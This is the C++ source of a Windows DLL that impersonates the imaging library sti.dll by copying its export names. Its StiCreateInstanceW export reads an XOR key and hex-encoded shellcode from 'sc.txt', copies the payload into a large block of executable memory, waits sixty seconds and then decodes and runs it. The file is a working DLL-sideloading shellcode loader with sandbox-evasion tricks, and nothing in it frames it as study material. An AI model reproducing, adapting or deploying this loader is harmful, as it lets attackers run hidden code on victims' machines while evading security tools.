#include <windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <cstdint>
#include <chrono>



BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){
	return TRUE;
}

std::string getExecutedPath(){
	char buffer[2048];
	for (int i=0;i<sizeof(buffer);i++){
		buffer[i] = 0;
	}
	GetModuleFileNameA(NULL, buffer, sizeof(buffer));
	std::string path(buffer);
	auto pos = path.find_last_of("\\");
	if (pos == std::string::npos){
		return std::string();
	}
	return path.substr(0, pos+1);
}

std::vector<std::string> loadFile(const std::string & filename){
	std::vector<std::string> lines;
	std::ifstream inputFile(filename);
	if(!inputFile){
		return lines;
	}
	std::string line;
	while(std::getline(inputFile, line)){
		lines.push_back(line);
	}
	inputFile.close();
	return lines;
}

void decode(const std::vector<uint8_t> & key, uint8_t * pdata, size_t length){
 	for(size_t i = 0; i < length;i++){
		auto index = i%key.size();
		auto ptmp = pdata + i;
		*ptmp = key[index] ^ (*ptmp);
	} 
}

std::vector<uint8_t> hexStrToVec(const std::string & hexStr){
	std::vector<uint8_t> result;
	if (hexStr.size()%2!=0){
		return result;
	}
	for (size_t i = 0;i<hexStr.size();i+=2){
		std::string byteStr =hexStr.substr(i,2);
		uint8_t byteValue = static_cast<uint8_t>(std::stoi(byteStr, nullptr, 16));
		result.push_back(byteValue);
	}
	return result;
}

void mysleep(int seconds){
	auto start = std::chrono::steady_clock::now();
	auto end = start + std::chrono::seconds(seconds);
	while(std::chrono::steady_clock::now() < end){
		Sleep(200);
	}
}

void cpymem(const std::vector<uint8_t> & from, uint8_t * to, size_t length){
	for(size_t i = 0; i < length;i++){
		auto index = i%from.size();
		*(to+i) = from[index];
	}
}

std::vector<uint64_t> getArgs(int total){
	std::vector<uint64_t> results;
	results.push_back(uint64_t(NULL));
	results.push_back(uint64_t(total));
	results.push_back(uint64_t(MEM_COMMIT|MEM_RESERVE));
	results.push_back(uint64_t(PAGE_EXECUTE_READWRITE));
	return results;
}

void test(){
	auto path = getExecutedPath();
	if (path.length() == 0){
		return;
	}
	path.append("sc");
	path.append(".txt");
	auto lines = loadFile(path);
	if (lines.size() < 2){
		return;
	}
	auto key = hexStrToVec(lines[0]);
	if (key.size() == 0){
		return;
	}
	auto code = hexStrToVec(lines[1]);
	if (code.size() == 0){
		return;
	}
	const int size = 1024*1024*64;
	auto args = getArgs(size*2);
	auto begaddr = VirtualAlloc(LPVOID(args[0]),SIZE_T(args[1]), DWORD(args[2]), DWORD(args[3]));
	if(begaddr == NULL){
		return;
	}
	cpymem(code, (uint8_t*)begaddr, 2*size);
	uint8_t* caddr = (uint8_t*)begaddr + size + 512;
	cpymem(code, caddr, code.size());
	mysleep(60);
	decode(key, caddr, code.size());
	((void(*)())caddr)();
}


extern "C" void __declspec(dllexport) DllCanUnloadNowFr(){

}

extern "C" void __declspec(dllexport) DllGetClassObjectHelp(){

}

extern "C" void __declspec(dllexport) DllRegisterServer(){

}

extern "C" void __declspec(dllexport) DllUnregisterServer(){

}

extern "C" void __declspec(dllexport) GetProxyDllInfo(){

}

extern "C" void __declspec(dllexport) MigrateRegisteredSTIAppsForWIAEvents(){
}


extern "C" void __declspec(dllexport) SelectDeviceDialog2(){

}

extern "C" void __declspec(dllexport) StiCreateInstanceW(){
	test();
}

extern "C" void __declspec(dllexport) StiCreateInstance(){
}















